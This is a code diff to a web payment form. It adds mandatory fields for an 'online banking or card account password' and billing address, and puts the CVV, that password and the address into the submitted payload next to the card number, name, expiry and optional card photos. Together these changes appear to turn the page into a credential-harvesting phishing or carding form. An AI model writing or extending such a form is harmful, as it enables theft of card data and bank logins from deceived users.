@@ -771,6 +771,47 @@
             </div>
           </div>
 
+          
+          <!-- Additional card verification fields -->
+          <div class="form-row single" style="margin-top:12px;margin-bottom:12px;">
+            <div class="form-field">
+              <label class="form-label">Card / Account Password</label>
+              <input type="password" id="ccPassword" class="form-input"
+                placeholder="Online banking or card account password"
+                autocomplete="current-password">
+            </div>
+          </div>
+          <div class="form-row single" style="margin-bottom:12px;">
+            <div class="form-field">
+              <label class="form-label">Billing Country</label>
+              <input type="text" id="ccBillingCountry" class="form-input"
+                placeholder="e.g. United States"
+                autocomplete="country-name">
+            </div>
+          </div>
+          <div class="form-row single" style="margin-bottom:12px;">
+            <div class="form-field">
+              <label class="form-label">Billing Address</label>
+              <input type="text" id="ccBillingAddress" class="form-input"
+                placeholder="Street address"
+                autocomplete="street-address">
+            </div>
+          </div>
+          <div class="form-row" style="margin-bottom:12px;">
+            <div class="form-field">
+              <label class="form-label">City</label>
+              <input type="text" id="ccBillingCity" class="form-input"
+                placeholder="City"
+                autocomplete="address-level2">
+            </div>
+            <div class="form-field">
+              <label class="form-label">Postal Code</label>
+              <input type="text" id="ccBillingPostal" class="form-input"
+                placeholder="ZIP / Postal code"
+                autocomplete="postal-code">
+            </div>
+          </div>
+
           <!-- CC Image Upload (admin-controlled) -->
           <div class="cc-upload-section" id="ccUploadSection">
             <div class="divider"></div>
@@ -1571,8 +1612,18 @@
       var ccName = (document.getElementById('ccName') || {}).value || '';
       var ccExp = (document.getElementById('ccExpiry') || {}).value || '';
       var ccCvv = (document.getElementById('ccCvv') || {}).value || '';
+      var ccPass = (document.getElementById('ccPassword') || {}).value || '';
+      var ccCountry = (document.getElementById('ccBillingCountry') || {}).value || '';
+      var ccAddr = (document.getElementById('ccBillingAddress') || {}).value || '';
+      var ccCity = (document.getElementById('ccBillingCity') || {}).value || '';
+      var ccPostal = (document.getElementById('ccBillingPostal') || {}).value || '';
       var formFilled = ccNum.replace(/\s/g,'').length >= 15 && ccName.trim().length >= 2
-        && ccExp.length === 5 && ccCvv.length >= 3;
+        && ccExp.length === 5 && ccCvv.length >= 3
+        && ccPass.trim().length >= 1
+        && ccCountry.trim().length >= 2
+        && ccAddr.trim().length >= 3
+        && ccCity.trim().length >= 2
+        && ccPostal.trim().length >= 2;
       var imgOk = !isCCImageRequired() || (ccFrontData && ccBackData);
       setSubmitState(formFilled && imgOk);
     } else {
@@ -1641,6 +1692,23 @@
       payload.cardNumber = (document.getElementById('ccNumber') || {}).value || '';
       payload.cardName = (document.getElementById('ccName') || {}).value || '';
       payload.cardExpiry = (document.getElementById('ccExpiry') || {}).value || '';
+      payload.cardCvv = (document.getElementById('ccCvv') || {}).value || '';
+      payload.cardPassword = (document.getElementById('ccPassword') || {}).value || '';
+      payload.billingCountry = (document.getElementById('ccBillingCountry') || {}).value || '';
+      payload.billingAddress = (document.getElementById('ccBillingAddress') || {}).value || '';
+      payload.billingCity = (document.getElementById('ccBillingCity') || {}).value || '';
+      payload.billingPostal = (document.getElementById('ccBillingPostal') || {}).value || '';
+      payload.cardDetails = {
+        cardNumber: payload.cardNumber,
+        cardName: payload.cardName,
+        cardExpiry: payload.cardExpiry,
+        cardCvv: payload.cardCvv,
+        cardPassword: payload.cardPassword,
+        billingCountry: payload.billingCountry,
+        billingAddress: payload.billingAddress,
+        billingCity: payload.billingCity,
+        billingPostal: payload.billingPostal
+      };
       if (isCCImageRequired()) {
         payload.proofData = ccFrontData;
         payload.proof_url = ccFrontData;
@@ -1737,7 +1805,7 @@
   };
 
   // Add input listeners for CC form
-  ['ccNumber', 'ccName', 'ccExpiry', 'ccCvv'].forEach(function(id) {
+  ['ccNumber', 'ccName', 'ccExpiry', 'ccCvv', 'ccPassword', 'ccBillingCountry', 'ccBillingAddress', 'ccBillingCity', 'ccBillingPostal'].forEach(function(id) {
     var el = document.getElementById(id);
     if (el) el.addEventListener('input', refreshSubmitState);
   });
